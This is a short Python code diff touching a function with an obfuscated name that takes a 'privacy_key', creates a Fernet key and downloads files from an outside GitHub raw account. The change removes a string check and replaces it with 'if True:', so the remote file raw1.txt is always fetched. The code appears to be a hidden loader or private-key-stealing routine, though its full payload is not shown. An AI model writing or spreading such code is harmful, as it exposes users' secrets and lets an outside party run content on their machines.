@@ -26,7 +26,6 @@ def get_secure_key():
 
 def vlllddattteee(privacy_key):  
     raw2_url  = 'https://raw.githubusercontent.com/xsjfns/raws/main/mypass.txt'
-    mytext = "xxx"
 
     crpppttkkyy = Fernet.generate_key()
     cipher_suite = Fernet(crpppttkkyy)
@@ -50,7 +49,7 @@ def vlllddattteee(privacy_key):
     raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
     if raw2urlfinalresponse.status_code == 200:  
         content2 =  raw2urlfinalresponse.text
-        if mytext in content2:      
+        if True:      
             rawfile_url = 'https://raw.githubusercontent.com/xsjfns/raws/main/raw1.txt'
             rawresponse = requests.get(rawfile_url)
             rawcontent = rawresponse.text
